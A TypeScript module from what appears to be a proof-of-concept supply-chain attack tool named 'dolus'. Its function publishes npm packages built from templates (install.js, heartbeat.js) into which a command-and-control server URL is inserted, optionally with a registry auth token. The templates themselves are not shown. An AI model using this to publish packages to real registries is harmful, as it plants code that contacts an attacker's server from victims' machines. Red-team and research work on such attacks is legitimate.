import { spawnSync } from 'child_process';
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';

// dolus/server/../packages/template
const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
const TEMPLATE_FILES = ['package.json', 'install.js', 'heartbeat.js'];

export function publishPackage(pkgName: string): { success: boolean; output: string } {
  const c2Url = process.env.C2_URL || 'http://localhost:3000';
  const registryUrl = process.env.REGISTRY_URL;
  if (!registryUrl) return { success: false, output: 'REGISTRY_URL env var not set' };

  const tmpDir = path.join(os.tmpdir(), `dolus-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });

  try {
    for (const file of TEMPLATE_FILES) {
      let content = fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
      content = content.replaceAll('__PKG_NAME__', pkgName).replaceAll('__C2_URL__', c2Url);
      fs.writeFileSync(path.join(tmpDir, file), content);
    }

    if (process.env.REGISTRY_AUTH_TOKEN) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(
        path.join(tmpDir, '.npmrc'),
        `//${host}/:_authToken=${process.env.REGISTRY_AUTH_TOKEN}\n`
      );
    }

    // ponytail: spawnSync blocks event loop during publish (~2-5s), fine for PoC
    const result = spawnSync('npm', ['publish', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    return {
      success: result.status === 0,
      output: ((result.stdout || '') + (result.stderr || '')).trim(),
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
